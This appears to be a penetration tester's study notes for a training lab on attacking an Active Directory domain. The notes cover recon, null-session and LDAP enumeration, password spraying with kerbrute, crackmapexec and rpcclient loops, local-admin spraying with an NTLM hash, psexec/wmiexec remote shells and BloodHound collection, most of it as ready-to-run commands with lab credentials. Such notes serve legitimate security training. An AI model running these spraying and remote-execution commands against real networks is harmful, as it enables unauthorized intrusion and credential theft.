## External Recon and Enumeration
- look through BGP-toolkit by Hurricane Electric for IP Space details
- viewdns.info for all DNS realated information
- go through companies social media, website and all the publicly available data
- dork for internal emails, files.
- use linkedin2username for username harvesting
- use dehashed for hunting cleartext passwords

# Initial domain enumeration
- Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
- This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
- Document any findings we come across for later use. Extremely important!

| Data Point |	Description |
|-----------|------------|
| AD Users	| We are trying to enumerate valid user accounts we can target for password spraying. |
| AD Joined Computers	| Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
| Key Services	| Kerberos, NetBIOS, LDAP, DNS |
| Vulnerable Hosts and Services	| Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold) |

## Identifying hosts
### wireshark
use wireshark to grather ARP, MDNS and other layer two packets.
*from the scan results we can identify the hosts 172.16.5.130, 172.16.5.225, 172.16.5.5, 172.16.5.25, 172.16.5.240*
*and from NBNS/MDNS protocol we identified the host ACADEMY-EA-WEB0<00> & ACADEMY-EA-WEB0<20>*
**TCPDUMP can also be used for this purpose** 
### Responder
Responder is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses. It has many more functions.
### perform fping on the subnet to identify the live hosts
### nmap -- use it to enumerate all the hosts that we found till now.
## Identifying users
### Kerbrute
Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrust. 
## Password spraying
After obtaining the usernames we can try to perform password spraying but for that it'll be easier if we can retrieve the password policy enforced.
This can be done either by SMB NULL session or LDAP Anonymous bind.
If there are know credentials crackmapexec can be used
```
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
### rpcclient
```
rpcclient -U "" -N 172.16.5.5
>querydominfo
>getdompwinfo
```
### enum4linux or enum4linux-ng
```
enum4linux -P 172.16.5.5
```
Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
```
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
### Enumerating Null Session - from Windows
```
net use \\DC01\ipc$ "" /u:""
```
### linux - LDAP Anonymous bind
With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### windows
If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.
```
net accounts
```
```
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

## Detailed User Enumeration
- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist
### using enum4linux
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
### rpcclient
```
rpcclient -U "" -N 172.16.5.5
>enumdomusers
```
### crackmapexec
```
crackmapexec smb 172.16.5.5 --users
```
### ldapsearch
If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
### windapsearch
Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
### using kerbrute
```
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
## Password spraying
### using rpcclient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
### using kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
### using crackmapexec
```
 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
### local admin spraying with crackmapexec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
## Internal password spraying from a domain joined windows
### Using DomainPasswordSpray.ps1
```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Credential Enumeration from Linux
for this process we need atleast one valid credential to any account or service in the domain
### Crackmapexec
using SMB we can list users, shares, groups, loggedon-users and even look through the shares
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
the results from the spider_plus module will be stored in /tmp/spider_plus/<ipadd>
### SMBMap
credentialed enumeration
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
recursively listing directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
### rpcclient
as there is an SMB NULL session in this case unauthenticated enumeration can be performed using rpcclient. authenticated enumeration is also possible.
```
rpcclient -U "" -N 172.16.5.5
```
then we can list users and their RIDs. This will be helpful later. We will even be able create new users, groups etc.
### Impacket Toolkit
focusing on wmiexec.py and psexec.py
 The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
wmiexec.py. It is a stealthier approach than psexec.py. But it is not fully interactive and creates a new instance for every command. And it doesn't give SYSTEM32
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
### Windapsearch
domain admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
privileged users
```
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
### Bloodhound
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
zip the results and upload to the bloodhound gui to run queries on the data.

